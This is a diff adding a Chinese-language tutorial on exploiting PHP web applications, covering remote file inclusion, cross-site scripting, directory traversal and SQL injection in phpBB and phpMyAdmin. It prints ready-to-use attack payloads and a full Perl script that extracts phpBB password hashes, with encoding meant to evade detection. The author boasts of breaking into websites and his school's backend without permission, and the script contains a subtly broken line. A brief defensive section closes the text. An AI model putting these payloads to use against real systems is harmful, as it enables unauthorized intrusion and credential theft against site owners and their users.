@@ -1,0 +1,132 @@
+从现在的网络安全来看,大家最关注和接触最多的WEB页面漏洞应该是ASP了,在这方面,小竹是专家,我没发言权.然而在PHP方面来看,也同样存在很严重的安全问题,但是这方面的文章却不多.在这里,就跟大家来稍微的讨论一下PHP页面的相关漏洞吧. 
+
+
+  我对目前常见的PHP漏洞做了一下总结,大致分为以下几种:包含文件漏洞,脚本命令执行漏洞,文件泄露漏洞,SQL注入漏洞等几种.当然,至于COOKIE欺骗等一部分通用的技术就不在这里讨论了,这些资料网上也很多.那么,我们就一个一个来分析一下怎样利用这些漏洞吧! 
+
+
+  首先,我们来讨论包含文件漏洞.这个漏洞应该说是PHP独有的吧.这是由于不充分处理外部提供的恶意数据,从而导致远程攻击者可以利用这些漏洞以WEB进程权限在系统上执行任意命令.我们来看一个例子:假设在a.php中有这样一句代码: 
+<?php 
+include($include."/xxx.php"); 
+?> 
+在这段代码中,$include一般是一个已经设置好的路径,但是我们可以通过自己构造一个路径来达到攻击的目的.比方说我们提交:a.php?include=http://web/b.php,这个web是我们用做攻击的空间,当然,b.php也就是我们用来攻击的代码了.我们可以在b.php中写入类似于:passthru("/bin/ls /etc");的代码.这样,就可以执行一些有目的的攻击了.(注:web服务器应该不能执行php代码,不然就出问题了.相关详情可以去看<<如何对PHP程序中的常见漏洞进行攻击>>).在这个漏洞方面,出状况的很多,比方说:PayPal Store Front, 
+HotNews,Mambo Open Source,PhpDig,YABB SE,phpBB,InvisionBoard,SOLMETRA SPAW Editor,Les Visiteurs,PhpGedView,X-Cart等等一些. 
+
+
+  接着,我们再来看一下脚本命令执行漏洞.这是由于对用户提交的URI参数缺少充分过滤，提交包含恶意HTML代码的数据，可导致触发跨站脚本攻击，可能获得目标用户的敏感信息。我们也举个例子:在PHP Transparent的PHP PHP 4.3.1以下版本中的index.php页面对PHPSESSID缺少充分的过滤,我们可以通过这样的代码来达到攻击的目的: 
+http://web/index.php?PHPSESSID="><script>...</script>在script里面我们可以构造函数来获得用户的一些敏感信息.在这个漏洞方面相对要少一点,除了PHP Transparent之外还有:PHP-Nuke,phpBB,PHP Classifieds,PHPix,Ultimate PHP Board等等. 
+
+
+  再然后,我们就来看看文件泄露漏洞了.这种漏洞是由于对用户提交参数缺少充分过滤，远程攻击者可以利用它进行目录遍历攻击以及获取一些敏感信息。我们拿最近发现的phpMyAdmin来做例子.在phpMyAdmin中,export.php页面没有对用户提交的'what'参数进行充分过滤,远程攻击者提交包含多个'../'字符的数据，便可绕过WEB ROOT限制，以WEB权限查看系统上的任意文件信息。比方说打入这样一个地址:export.php?what=../../../../../../etc/passwd%00 就可以达到文件泄露的目的了.在这方面相对多一点,有:myPHPNuke,McNews等等. 
+
+
+  最后,我们又要回到最兴奋的地方了.想想我们平时在asp页面中用SQL注入有多么爽,以前还要手动注入,一直到小竹悟出"SQL注入密笈"(嘿嘿),然后再开做出NBSI以后,我们NB联盟真是拉出一片天空.曾先后帮CSDN,大富翁论坛,中国频道等大型网站找出漏洞.(这些废话不多说了,有点跑题了...).还是言规正传,其实在asp中SQL的注入和php中的SQL注入大致相同,只不过稍微注意一下用的几个函数就好了.将asc改成ASCII,len改成LENGTH,其他函数基本不变了.其实大家看到PHP的SQL注入,是不是都会想到PHP-NUKE和PHPBB呢?不错,俗话说树大招分,像动网这样的论坛在asp界就该是漏洞这王了,这并不是说它的论坛安全太差,而是名气太响,别人用的多了,研究的人也就多了,发现的安全漏洞也就越多了.PHPBB也是一样的,现在很大一部分人用PHP做论坛的话,一般都是选择了PHPBB.它的漏洞也是一直在出,从最早phpBB.com phpBB 1.4.0版本被人发现漏洞,到现在最近的phpBB 2.0.6版本的groupcp.php,以及之前发现的search.php,profile.php,viewtopic.php等等加起来,大概也有十来个样子吧.这也一直导致,一部分人在研究php漏洞的时候都会拿它做实验品,所谓百练成精嘛,相信以后的PHPBB会越来越好. 
+
+
+  好了,我们还是来分析一下漏洞产生的原因吧.拿viewtopic.php页面来说,由于在调用viewtopic.php时，直接从GET请求中获得"topic_id"并传递给SQL查询命令,而并没有进行一些过滤的处理,攻击者可以提交特殊的SQL字符串用于获得MD5密码，获得此密码信息可以用于自动登录或者进行暴力破解。(我想应该不会有人想去暴力破解吧,除非有特别重要的原因).先看一下相关源代码: 
+#     if ( isset($HTTP_GET_VARS[POST_TOPIC_URL]) ) 
+#     { 
+#         $topic_id = intval($HTTP_GET_VARS[POST_TOPIC_URL]); 
+#     } 
+#     else if ( isset($HTTP_GET_VARS['topic']) ) 
+#     { 
+#         $topic_id = intval($HTTP_GET_VARS['topic']); 
+#     } 
+从上面我们可以看出,如果提交的view=newest并且sid设置了值的话,执行的查询代码像下面的这个样子(如果你还没看过PHPBB源代码的话,建议你看了再对着这里来看,受影响系统为:phpBB 2.0.5和phpBB 2.0.4). 
+#           $sql = "SELECT p.post_id 
+#           FROM " . POSTS_TABLE . " p, " . SESSIONS_TABLE . " s, " . USERS_TABLE . " u 
+#           WHERE s.session_id = '$session_id' 
+#             AND u.user_id = s.session_user_id 
+#             AND p.topic_id = $topic_id 
+#             AND p.post_time >= u.user_lastvisit 
+#           ORDER BY p.post_time ASC 
+#           LIMIT 1"; 
+Rick提供了下面的这断测试代码: 
+use IO::Socket; 
+$remote = shift || 'localhost'; 
+$view_topic = shift || '/phpBB2/viewtopic.php'; 
+$uid = shift || 2; 
+$port = 80; 
+$dbtype = 'mysql4';   # mysql4 or pgsql 
+print "Trying to get password hash for uid $uid server $remote dbtype: $dbtype\n"; 
+$p = ""; 
+for($index=1; $index<=32; $index++) 
+{ 
+    $socket = IO::Socket::INET->new(PeerAddr => $remote, 
+                    PeerPort => $port, 
+                    Proto => "tcp", 
+                    Type => SOCK_STREAM) 
+    or die "Couldnt connect to $remote:$port : $@\n"; 
+    $str = "GET $view_topic" . "?sid=1&topic_id=-1" . random_encode(make_dbsql()) . "&view=newest" . " HTTP/1.0\n\n"; 
+    print $socket $str; 
+    print $socket "Cookie: phpBB2mysql_sid=1\n";   # replace this for pgsql or remove it 
+    print $socket "Host: $remote\n\n"; 
+    while ($answer = <$socket>) 
+    { 
+          if ($answer =~ /location:.*\x23(\d+)/) # Matches the location: viewtopic.php?p=<num>#<num> 
+          { 
+                $p .= chr (); 
+          } 
+    } 
+    close($socket); 
+} 
+print "\nMD5 Hash for uid $uid is $p\n"; 
+# random encode str. helps avoid detection 
+sub random_encode 
+{ 
+    $str = shift; 
+    $ret = ""; 
+    for($i=0; $i<length($str); $i++) 
+    { 
+          $c = substr($str,$i,1); 
+          $j = rand length($str) * 1000; 
+
+
+          if (int($j) % 2 || $c eq ' ') 
+          { 
+                $ret .= "%" . sprintf("%x",ord($c)); 
+          } 
+          else 
+          { 
+                $ret .= $c; 
+          } 
+    } 
+    return $ret; 
+} 
+sub make_dbsql 
+{ 
+    if ($dbtype eq 'mysql4') 
+    { 
+          return " union select ord(substring(user_password," . $index . ",1)) from phpbb_users where user_id=$uid/*" ; 
+    } elsif ($dbtype eq 'pgsql') 
+    { 
+          return "; select ascii(substring(user_password from $index for 1)) as post_id from phpbb_posts p, phpbb_users u where u.user_id=$uid or false"; 
+    } 
+    else 
+    { 
+          return ""; 
+    } 
+} 
+这断代码,我就不多做解释了.作用是获得HASH值. 
+
+
+  看到这里,大家可能有点疑问,为什么我前面讲的那些改的函数怎么没有用到,我讲出来不怕大家笑话:其实网上很多站点有些页面的查询语句看起来会是这样: 
+display.php?sqlsave=select+*+from+aaa+where+xx=yy+order+by+bbb+desc 
+不要笑,这是真的,我还靠这个进过几个大型网站.至于哪一些,不好讲出来,不过我们学校的网站,我就是靠这个进后台的(希望学校网络中心的看不到这篇文章,^_^).把前面那函数用上吧.不然你只有改人家的密码了哦!!! 
+
+
+  差点忘了一点,在SQL注入的时候,PHP与ASP有所不同,mysql对sql语句的运用没有mssql灵活,因此,很多在mssql上可以用的查询语句在mysql数据库中都不能奏效了. 一般我们常见的注入语句像这样:aaa.php?id=a' into outfile 'pass.txt或是aaa.php?id=a' into outfile 'pass.txt' /*再进一步可以改成:aaa.php?id=a' or 1=1 union select id,name,password form users into outfile 'c:/a.txt 
+这样可以将数据库数据导出为文件,然后可以查看. 
+或是这样:mode=',user_level='4 
+这个语句一般用在修改资料时,假设页面存在漏洞的话,就可以达到提升权限的做用. 
+其它的如' OR 1=1 -- 或者:1' or 1='1则跟asp差不多.这里不多讲了.在php里面,SQL注入看来还是漏洞之首啊,有太多的页面存在这个问题了. 
+
+
+  其实大家可以看出来,上面那些分类归根结底只有一个原因:提交参数没过滤或是过滤不够严谨.黑客防线向来有攻有守.这里,就大致讲一下防范的方法吧. 
+  
+  首先,我个人认为最重要的一点是将magic_quotes_gpc高为ON,它的作用是将单引号,双引号,反斜线,和空字符转换为含有反斜线的字符,如select * from admin where username='$username' and password='$password'语句,攻击者想用1' or 1='1跳过验证,但是,那些字符串将被转换成这样:select * from admin where username='a' and password='1\' or 1=\'1'从而达到阻止注入的目的,事实也就是自动进行了addslashes()操作.再不行的话,自己定义函数处理吧.现在看来,那些搞PHP注入的人也比较郁闷,因为myslq4以下版本不支持子语句,而新版本的mysql又会将magic_quotes_gpc选项默认为开. 
+
+
+  解决包含文件漏洞用的方法就是:要求程序员包含文件里的参数尽量不要使用变量，如果使用变量，就一定要严格检查要包含的文件名，绝对不能由用户任意指定,建议设global_variables为off。如前面文件打开中限制PHP操作路径是一个必要的选项。另外，如非特殊需要，一定要关闭PHP的远程文件打开功能。修改php.ini文件：allow_url_fopen = Off(注:参见<<PHP安全问题：远程溢出、DoS、safe_mode绕过漏洞>>). 
+
+
+  还有一点我觉得很多网站都会有这个问题,就是没有关错误显示.轻一看可能没什么,但是一些盯了很久(用词有点不对哦)的人就可以通过错误提示来获得如数据库信息,网页文件物理路径等等
